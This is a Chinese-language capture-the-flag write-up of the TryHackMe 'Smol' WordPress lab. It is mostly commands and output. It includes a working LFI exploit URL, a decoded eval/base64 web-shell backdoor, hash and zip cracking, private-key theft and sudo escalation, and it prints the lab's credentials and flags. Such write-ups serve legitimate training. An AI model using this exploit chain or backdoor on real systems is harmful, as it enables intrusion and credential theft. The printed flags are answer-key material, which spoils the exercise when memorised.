THM SMOL 渗透测试完整 Writeup (2026-05-29)

**目标**: 10.49.147.177 - TryHackMe 靶场 (SMOL)
**授权**: THM 授权靶场，全 IP 范围，无限制
**测试日期**: 2026-05-29
**总耗时**: ~60 分钟

---

## 1. 信息搜集

### 1.1 Nmap 端口扫描

```bash
# 快速扫描
nmap -sV -sC -T4 10.49.147.177 -oX /home/yao/.openclaw/workspace/pentest/runs/10.49.147.177/nmap/quick-scan.xml

# 全端口扫描
nmap -sV -sC -O -p- --min-rate 1000 10.49.147.177 -oX /home/yao/.openclaw/workspace/pentest/runs/10.49.147.177/nmap/all-ports.xml
```

**扫描结果**:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

### 1.2 添加 Hosts 解析

HTTP 访问重定向到 `www.smol.thm`，需要添加 hosts：

```bash
echo "10.49.147.177 www.smol.thm" | sudo tee -a /etc/hosts
```

---

## 2. Web 枚举

### 2.1 目录扫描

```bash
gobuster dir -k -u http://www.smol.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 50
```

**关键发现**:
- `/wp-admin/` - WordPress 管理后台 (301)
- `/wp-login.php` - 登录页面 (200)
- `/wp-config.php` - 配置文件 (200, Size: 0)
- `/wp-signup.php` - 注册页面 (302 重定向到登录)
- `/xmlrpc.php` - XML-RPC 接口 (405)
- `/license.txt` - WordPress 许可证 (200)
- `/readme.html` - WordPress 说明 (200)

**结论**: 目标运行 WordPress CMS

### 2.2 WordPress 扫描

```bash
wpscan --url http://www.smol.thm/ -e u,ap,at
```

**扫描结果**:
- **WordPress 版本**: 6.7.1 (Insecure)
- **主题**: twentytwentythree v1.2 (过时，最新 1.6)
- **插件**:
  - **jsmol2wp v1.07** - 2018-03-09 发布
- **其他发现**:
  - XML-RPC 已启用
  - wp-content/uploads/ 目录列表明已启用
  - 主题目录列表明已启用

---

## 3. 漏洞发现与利用

### 3.1 文件包含漏洞 (LFI)

**漏洞位置**: `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php`

**漏洞分析**:
- jsmol2wp 插件的 `php/jsmol.php` 文件处理 `call=getRawDataFromDatabase` 请求时，未对 `query` 参数进行过滤
- 可通过 `php://filter` 包装器读取任意文件

**POC - 读取 wp-config.php**:
```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

**利用结果**:
```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
define( 'DB_HOST', 'localhost' );
```

**获取的凭据**:
| 服务         | 用户名 | 密码                     | 来源                |
| ------------ | ------ | ------------------------ | ------------------- |
| WordPress DB | wpuser | kbLSF2Vop#lw3rjDZ629*Z%G | wp-config.php (LFI) |

### 3.2 Hello Dolly 后门发现

通过 LFI 读取 `wp-content/plugins/hello.php`：

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

**后门代码**:
```php
function hello_dolly() {
    eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
    // ...
}
```

**Base64 解码**:
```bash
echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d
```

**解码结果**:
```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

**后门分析**:
- 触发条件: `$_GET["cmd"]` 参数存在
- 执行方式: `system()` 执行任意命令
- 触发位置: WordPress 后台 admin_notices 钩子
- 需要登录后台才能触发

---

## 4. 数据库连接与密码破解

### 4.1 MySQL 连接

```bash
mysql -u wpuser -p -h 10.49.147.177
# 密码: kbLSF2Vop#lw3rjDZ629*Z%G
```

### 4.2 用户枚举

```sql
USE wordpress;
SELECT user_login, user_pass FROM wp_users;
```

**结果**:
| 用户名 | 密码 hash                          |
| ------ | ---------------------------------- |
| admin  | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
| wpuser | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
| think  | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
| gege   | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
| diego  | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
| xavi   | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |

### 4.3 密码破解

```bash
# 保存 hash 到文件
cat > hash.txt << 'EOF'
$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
EOF

# 使用 john 破解
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**破解结果**:
- **diego**: `sandiegocalifornia`

---

## 5. 初始访问

### 5.1 SSH 登录

```bash
ssh diego@10.49.147.177
# 密码: sandiegocalifornia
```

### 5.2 获取 User Flag

```bash
cat /home/diego/user.txt
# 45edaec653ff9ee06236b7ce72b86963
```

---

## 6. 横向移动

### 6.1 发现 think 用户 SSH 私钥

```bash
ls -la /home/think/
# 发现 .ssh 目录

cat /home/think/.ssh/id_rsa
# -----BEGIN OPENSSH PRIVATE KEY-----
# ...
# -----END OPENSSH PRIVATE KEY-----
```

### 6.2 使用私钥登录 think

```bash
# 保存私钥到本地
chmod 600 id_rsa
ssh -i id_rsa think@10.49.147.177
```

### 6.3 切换到 gege 用户

```bash
su gege
# 无需密码，直接切换成功
```

### 6.4 发现 WordPress 备份文件

```bash
ls /home/gege/
# wordpress.old.zip

file /home/gege/wordpress.old.zip
# Zip archive data, at least v1.0 to extract
```

### 6.5 破解 ZIP 密码

```bash
zip2john /home/gege/wordpress.old.zip > wp.txt
john wp.txt -w=/usr/share/wordlists/rockyou.txt
```

**破解结果**:
- **ZIP 密码**: `hero_gege@hotmail.com`

### 6.6 解压并分析备份

```bash
cd /tmp
unzip -P hero_gege@hotmail.com /home/gege/wordpress.old.zip
cat wordpress.old/wp-config.php
```

**发现旧版凭据**:
```php
define( 'DB_USER', 'xavi' );
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
```

**获取的凭据**:
| 服务              | 用户名 | 密码          | 来源              |
| ----------------- | ------ | ------------- | ----------------- |
| WordPress DB (旧) | xavi   | P@ssw0rdxavi@ | wordpress.old.zip |

---

## 7. 权限提升

### 7.1 切换到 xavi 用户

```bash
su xavi
# 密码: P@ssw0rdxavi@
```

### 7.2 检查 sudo 权限

```bash
sudo -l
```

**结果**:
```
User xavi may run the following commands on ip-10-49-147-177:
    (ALL : ALL) ALL
```

**分析**: xavi 用户拥有完全 sudo 权限，可以执行任何命令

### 7.3 获取 Root

```bash
sudo su
# 或
sudo bash
```

### 7.4 获取 Root Flag

```bash
cat /root/root.txt
# bf89ea3ea01992353aef1f576214d4e4
```

---

## 8. 完整攻击路径

```
信息搜集
    ↓
Nmap 扫描 (22/80)
    ↓
添加 hosts (www.smol.thm)
    ↓
Web 枚举 (gobuster)
    ↓
发现 WordPress
    ↓
wpscan 扫描
    ↓
发现 jsmol2wp 插件
    ↓
LFI 漏洞利用
    ↓
读取 wp-config.php
    ↓
获取 MySQL 凭据 (wpuser:kbLSF2Vop#lw3rjDZ629*Z%G)
    ↓
连接 MySQL 数据库
    ↓
获取用户密码 hash (6 个用户)
    ↓
John 破解 (diego:sandiegocalifornia)
    ↓
SSH 登录 diego
    ↓
获取 User Flag (45edaec653ff9ee06236b7ce72b86963)
    ↓
发现 think 私钥 (/home/think/.ssh/id_rsa)
    ↓
SSH 登录 think
    ↓
su gege (无密码)
    ↓
发现 wordpress.old.zip
    ↓
John 破解 ZIP (hero_gege@hotmail.com)
    ↓
解压发现旧版 wp-config.php
    ↓
获取 xavi 凭据 (P@ssw0rdxavi@)
    ↓
su xavi
    ↓
sudo -l → (ALL : ALL) ALL
    ↓
sudo su → ROOT
    ↓
获取 Root Flag (bf89ea3ea01992353aef1f576214d4e4)
```

---

## 9. 发现的凭据汇总

| 服务              | 用户名 | 密码                     | 来源                    |
| ----------------- | ------ | ------------------------ | ----------------------- |
| WordPress DB      | wpuser | kbLSF2Vop#lw3rjDZ629*Z%G | wp-config.php (LFI)     |
| WordPress DB (旧) | xavi   | P@ssw0rdxavi@            | wordpress.old.zip       |
| SSH               | diego  | sandiegocalifornia       | john 破解 PHPass        |
| SSH               | think  | (私钥)                   | /home/think/.ssh/id_rsa |
| ZIP               | gege   | hero_gege@hotmail.com    | john 破解 PKZIP         |
| 系统              | xavi   | P@ssw0rdxavi@            | 凭据复用                |

---

## 10. 关键技术点

### 10.1 LFI 漏洞
- **位置**: jsmol2wp/php/jsmol.php
- **参数**: `call=getRawDataFromDatabase&query=`
- **利用**: `php://filter/resource=` 包装器读取任意文件
- **影响**: 读取 wp-config.php 获取数据库凭据

### 10.2 Hello Dolly 后门
- **位置**: wp-content/plugins/hello.php
- **类型**: `eval(base64_decode())` 后门
- **功能**: `system($_GET['cmd'])` 命令执行
- **触发**: admin_notices 钩子（需登录后台）

### 10.3 密码破解
- **工具**: john
- **类型**: PHPass hash ($P$ 格式)
- **字典**: rockyou.txt
- **结果**: diego:sandiegocalifornia

### 10.4 横向移动
- think → gege: 无密码 su
- gege → xavi: 旧版 wp-config.php 凭据复用

### 10.5 权限提升
- **类型**: sudo 完全权限
- **用户**: xavi
- **配置**: `(ALL : ALL) ALL`
- **方法**: `sudo su` 直接获取 root
